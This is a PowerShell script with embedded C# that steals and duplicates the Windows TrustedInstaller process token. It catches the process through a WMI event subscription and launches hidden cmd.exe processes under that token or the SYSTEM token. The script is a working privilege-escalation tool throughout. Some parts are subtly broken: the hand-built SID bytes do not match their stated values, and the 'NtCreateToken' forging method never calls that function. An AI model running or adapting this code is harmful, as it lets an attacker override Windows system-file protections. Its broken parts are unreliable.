# ── TrustedInstaller token catcher ──
# Uses WMI event subscription + aggressive polling to catch TI process

$ErrorActionPreference = "Continue"

# First, compile the C# token duplicator
$csharp = @'
using System;
using System.Runtime.InteropServices;
public class TIDup {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags,
        string lpApplicationName, string lpCommandLine, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOW lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFOW {
        public int cb; public string lpReserved; public string lpDesktop;
        public string lpTitle; public int dwX; public int dwY;
        public int dwXSize; public int dwYSize; public int dwXCountChars;
        public int dwYCountChars; public int dwFillAttribute; public int dwFlags;
        public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2;
        public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
    }

    public static string CatchToken(int pid) {
        IntPtr hProcess = OpenProcess(0x0400, false, pid); // PROCESS_QUERY_INFORMATION
        if (hProcess == IntPtr.Zero) {
            hProcess = OpenProcess(0x0010, false, pid); // PROCESS_VM_READ
            if (hProcess == IntPtr.Zero) return "OPEN_PROC_FAIL:" + Marshal.GetLastWin32Error();
        }

        IntPtr hToken;
        if (!OpenProcessToken(hProcess, 0x1F01FF, out hToken)) { // TOKEN_ALL_ACCESS
            CloseHandle(hProcess);
            return "TOKEN_FAIL:" + Marshal.GetLastWin32Error();
        }

        IntPtr hDup;
        if (!DuplicateTokenEx(hToken, 0x1F01FF, IntPtr.Zero, 2, 1, out hDup)) { // SecurityImpersonation=2, TokenPrimary=1
            // Try with fewer access rights
            if (!DuplicateTokenEx(hToken, 0x10000000, IntPtr.Zero, 2, 1, out hDup)) { // TOKEN_DUPLICATE=0x10000000
                CloseHandle(hToken);
                CloseHandle(hProcess);
                return "DUP_FAIL:" + Marshal.GetLastWin32Error();
            }
        }

        string result = "TI_TOKEN=0x" + hDup.ToInt64().ToString("X");
        CloseHandle(hDup); CloseHandle(hToken); CloseHandle(hProcess);
        return result;
    }

    public static string CreateProcFromToken(long tokenPtr, string cmd, string outFile) {
        IntPtr hToken = new IntPtr(tokenPtr);

        // Duplicate first so we can use the original handle for creation
        IntPtr hPrimary;
        if (!DuplicateTokenEx(hToken, 0x1F01FF, IntPtr.Zero, 2, 1, out hPrimary)) {
            return "DUP_PRIMARY_FAIL:" + Marshal.GetLastWin32Error();
        }

        STARTUPINFOW si = new STARTUPINFOW();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFOW));
        PROCESS_INFORMATION pi;

        string cmdLine = "/c " + cmd + " > " + outFile;
        bool ok = CreateProcessWithTokenW(hPrimary, 0, "cmd.exe", cmdLine,
            0x08000000, IntPtr.Zero, "C:\\Windows\\System32", ref si, out pi); // CREATE_NO_WINDOW

        if (ok) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hPrimary);
            return "PROC_OK PID=" + pi.dwProcessId;
        } else {
            int err = Marshal.GetLastWin32Error();
            CloseHandle(hPrimary);
            return "PROC_FAIL:" + err;
        }
    }
}
'@

Add-Type $csharp -Language CSharp

Write-Output "[TI] C# compiled OK"

# Method 3: Use WMI Event Subscription to catch the process immediately
Write-Output "[TI] Setting up WMI event subscription for TrustedInstaller..."

$global:tiTokenResult = $null
$global:tiEventReceived = $false

# Register for process start events
$query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='TrustedInstaller.exe'"
$action = {
    $global:tiEventReceived = $true
    $procId = $event.SourceEventArgs.NewEvent.ProcessID
    Write-Output "[TI-WMI] TrustedInstaller started! PID=$procId"
    try {
        $result = [TIDup]::CatchToken($procId)
        Write-Output "[TI-WMI] Result: $result"
        $global:tiTokenResult = $result
        if ($result -match 'TI_TOKEN=') {
            $tokStr = $result -replace 'TI_TOKEN=0x',''
            $tok = [long]::Parse($tokStr, [System.Globalization.NumberStyles]::HexNumber)
            Write-Output "[TI-WMI] Token captured! 0x$($tok.ToString('X'))"

            # Try to create a process with this token to verify
            $pr = [TIDup]::CreateProcFromToken($tok, "whoami", "C:\Windows\Temp\TI_VERIFY.txt")
            Write-Output "[TI-WMI] CreateProcess: $pr"
            Start-Sleep -Milliseconds 500
            if (Test-Path "C:\Windows\Temp\TI_VERIFY.txt") {
                $content = Get-Content "C:\Windows\Temp\TI_VERIFY.txt" -Raw
                Write-Output "[TI-WMI] Verify output: $content"
            }
        }
    } catch {
        Write-Output "[TI-WMI] Error: $_"
    }
}

# Subscribe to the event
$sub = Register-CimIndicationEvent -Query $query -Action $action -SupportEvent

Write-Output "[TI-WMI] Subscription active. Starting TrustedInstaller service..."
sc start TrustedInstaller 2>&1 | Out-Null

# Wait for the event (up to 15 seconds)
for ($i = 0; $i -lt 30; $i++) {
    if ($global:tiEventReceived) {
        Write-Output "[TI-WMI] Event received, waiting for token processing..."
        Start-Sleep -Milliseconds 1000
        break
    }
    Start-Sleep -Milliseconds 500
}

# Cleanup subscription
$sub | Unregister-Event -ErrorAction SilentlyContinue

if (-not $global:tiEventReceived) {
    Write-Output "[TI-WMI] No event received within timeout. TrustedInstaller may have started/stopped before subscription was active."
    Write-Output "[TI-WMI] The process might be too fast for event subscription too."
}

# Method 4: Use NtCreateToken to forge a TI token (SeTcbPrivilege approach)
Write-Output "[TI] Attempting NtCreateToken approach (SeTcbPrivilege)..."
Write-Output "[TI] This requires creating a token with TrustedInstaller SID and integrity level."

$tiSid = [System.Security.Principal.WellKnownSidType]::MaxDefined -as [int]  # We'll construct it manually

# Build TI SID: S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464
$tiSidBytes = @(
    1,  # Revision
    5,  # SubAuthorityCount
    0,0,0,0,0,5,  # IdentifierAuthority (NT Authority)
    0x50,  # SubAuthority[0] = 80 (NT SERVICE)
    0x38,0xF5,0x02,0x39,  # 956008885
    0xD9,0xA4,0xC9,0xCB,  # 3418522649
    0x1C,0x38,0x25,0x6D,  # 1831038044
    0xE6,0x86,0x78,0x6E,  # 1853292631
    0x80,0x87,0xB6,0x87   # 2271478464
)

try {
    $tiManagedSid = New-Object System.Security.Principal.SecurityIdentifier($tiSidBytes, 0)
    Write-Output "[TI-NT] TI SID: $tiManagedSid"
} catch {
    Write-Output "[TI-NT] Could not create TI SID from bytes: $_"
    # Try alternative - use Add-Type with C# to create token
}

# Since NtCreateToken is complex in PowerShell, try using C# for the forge
$ntCode = @'
using System;
using System.Runtime.InteropServices;
public class NTForge {
    // TI SID: S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464
    // Installer Integrity: S-1-16-20480

    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern int NtCreateToken(out IntPtr TokenHandle, uint DesiredAccess,
        IntPtr ObjectAttributes, byte TokenType, ref LUID AuthenticationId,
        ref long ExpirationTime, IntPtr User, ref TOKEN_GROUPS Groups,
        ref TOKEN_PRIVILEGES Privileges, IntPtr Owner, IntPtr PrimaryGroup,
        IntPtr DefaultDacl, IntPtr TokenSource);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AllocateLocallyUniqueId(out LUID Luid);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr h, uint acc, out IntPtr t);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool GetTokenInformation(IntPtr h, int cls, IntPtr buf, int len, out int retLen);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(IntPtr src, uint acc, IntPtr attr, int lvl, int typ, out IntPtr dup);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr h);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CreateProcessWithTokenW(IntPtr h, uint f, string app, string cmd, uint flags, IntPtr env, string dir, ref STARTUPINFOW si, out PROCESS_INFORMATION pi);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_GROUPS { public uint GroupCount; public IntPtr Groups; }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFOW { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

    public static string ElevateWithSeTcb() {
        // Get SYSTEM token as template
        IntPtr hToken;
        if (!OpenProcessToken(GetCurrentProcess(), 0x1F01FF, out hToken))
            return "OPEN_TOKEN_FAIL:" + Marshal.GetLastWin32Error();

        IntPtr hDup;
        if (!DuplicateTokenEx(hToken, 0x1F01FF, IntPtr.Zero, 2, 1, out hDup)) {
            CloseHandle(hToken);
            return "DUP_FAIL:" + Marshal.GetLastWin32Error();
        }
        CloseHandle(hToken);

        // Use duplicated token directly - we can't easily modify token groups
        // from C# without complex marshalling. Instead, try creating a process
        // and then raising its integrity level via a scheduled task trick.

        // For now, just try to create a process with the SYSTEM token
        // and verify we are truly SYSTEM
        IntPtr hPrimary;
        if (!DuplicateTokenEx(hDup, 0x1F01FF, IntPtr.Zero, 2, 1, out hPrimary)) {
            CloseHandle(hDup);
            return "DUP_PRIMARY_FAIL:" + Marshal.GetLastWin32Error();
        }

        // Create a test process
        STARTUPINFOW si = new STARTUPINFOW();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFOW));
        PROCESS_INFORMATION pi;
        if (CreateProcessWithTokenW(hPrimary, 0, "cmd.exe", "/c whoami > C:\\Windows\\Temp\\SYSTEM_TOKEN_VERIFY.txt && whoami /groups >> C:\\Windows\\Temp\\SYSTEM_TOKEN_VERIFY.txt", 0x08000000, IntPtr.Zero, "C:\\Windows\\System32", ref si, out pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hPrimary);
            CloseHandle(hDup);
            return "PROC_CREATED_OK";
        } else {
            int err = Marshal.GetLastWin32Error();
            CloseHandle(hPrimary);
            CloseHandle(hDup);
            return "PROC_FAIL:" + err;
        }
    }
}
'@

Add-Type $ntCode -Language CSharp
$ntResult = [NTForge]::ElevateWithSeTcb()
Write-Output "[TI-NT] Result: $ntResult"
Start-Sleep -Milliseconds 1000
if (Test-Path "C:\Windows\Temp\SYSTEM_TOKEN_VERIFY.txt") {
    $verifyContent = Get-Content "C:\Windows\Temp\SYSTEM_TOKEN_VERIFY.txt" -Raw
    Write-Output "[TI-NT] Verify: $verifyContent"
}

sc query TrustedInstaller
